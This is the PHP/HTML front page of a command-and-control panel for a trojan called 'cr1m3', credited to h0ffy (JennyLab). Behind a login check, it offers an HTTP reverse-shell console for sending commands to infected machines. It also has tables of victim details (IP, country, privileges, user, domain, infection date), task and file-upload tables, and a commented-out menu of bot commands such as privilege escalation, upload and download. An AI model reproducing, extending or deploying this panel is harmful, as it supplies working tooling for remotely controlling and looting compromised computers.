<?php
	require_once("mod_login.php");
	require_once("db.php");
	require_once("security.php");

//main()

	if(__login_status()==false) {
		header("Location: login.php");
		return 0;	
	}

	$botid = trim($_GET['bid']);

	if(!empty($botid)) {
		__security_input($botid,1);

	}
	

?>

<html>
<head>
        <title>cr1m3 tr0jan...</title>
        <link type="text/css" rel="stylesheet" href="css/main.css">
	<script type="text/javascript" src="js/ajax.js"></script>
	<noscript>Your browser not support reverse shell Ajax because javascript has been disable</noscript> 
</head>

<body onkeypress="javascript:__get_keyboard(event,this);">

<header>
	<h1>Cr1m3</h1>
</header>
<nav>
	<ul>
		<li><a href="./main.php">Main</a></li>
		<li><a href="./list.php">Bots</a></li>
		<li><a href="./massive.php">Massive</a></li>
		<li><a href="./update.php">Update</a></li>
		<li><a href="./panic.php">Panic</a></li>
		<li><a href="./logout.php">Logout</a></li>
	</ul>
</nav>
<section>
	
	<!--
 	<article>
		<form>
			<h2>Bot Commands</h2>
			<span>Select Command:</span>
			<select name="command" alt="Click here..">
				<option value="owned">0wn3d</option>
				<option value="funny">Funny</option>
				<option value="privescalation">Priv Escalation</option>
				<option value="upload">Upload</option>
				<option value="download">Download</option>
				<option value="list_process">List Process</option>
				<option value="list_directory">List Directory</option>
			</select>

			<span>Inputs args (-h):</span>
			<input type="text" value="">
			<input type="submit" value="Execute">
			
		</form>
	</article> -->

	<article>
		<form action="javascript:void(0);" name="rev_form" class="rev_shell">
		<h2>HTTP Shell (Cmd Line)</h2>
			<span>Output:</span>
			<textarea readonly name="txtReplyShell">
			</textarea>
			<span>Execute:</span>
			<input type="text" class="execute" name="txtcommand">
			<input type="button" onclick="javascript:__shell_send();" onKeyPress="javascript:__get_keyboard(event,this);" name="enter_button" value="Enter">
			<input type="button" onclick="javascript:__shell_load();" name="start_button" value="Start">
			<input type="button" onclick="javascript:__shell_clear();" name="clear_button" value="Clear">
		</form>
	</article>

	<article>
		<table>
			<tr>
				<th>IP</th>
				<th>Country</th>
				<th>Privileges</th>
				<th>Infection Date</th>
			</tr>
		</table>
	
		<table>
			<tr>
				<th>User</th>
				<th>PC</th>
				<th>Domain</th>
				<th>Last</th>
			</tr>
		</table>



		<table><!-- task -->
			<tr>
				<th>BotID</th>
				<th>Command</th>
			</tr>
		</table>


		<table><!-- upload file-->
			<tr>
				<th>FileName</th>
				<th>HASH</th>
			</tr>
		</table>



	</article>
	

</section>

<footer>
	@cr1m3 // by h0ffy (JennyLab)
</footer>


</body>
</html>
